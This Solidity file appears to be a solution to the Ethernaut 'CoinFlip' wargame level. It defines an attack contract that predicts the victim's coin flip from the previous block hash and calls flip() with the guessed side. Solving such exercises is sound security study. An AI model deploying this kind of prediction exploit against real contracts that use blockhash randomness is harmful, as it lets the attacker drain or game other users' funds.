// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

import "./coinflip.sol";

contract CoinFlipSmokeIt {

    // create an instance of the deployed coinflip contract, address from the oz level task
    CoinFlip public victimAddr; 
    // FACTOR is needed for executing the logic
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    // constructor is initialising the victim address as pointer to and interact with the coinflip contract itself
    constructor(address _victimAddr) public {
        victimAddr = CoinFlip(_victimAddr);
    }

    // the function below takes the logics from the coinflip contract
    function flipAttack() public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        // calls the flip function from the coinflip 
        victimAddr.flip(side);
    }

}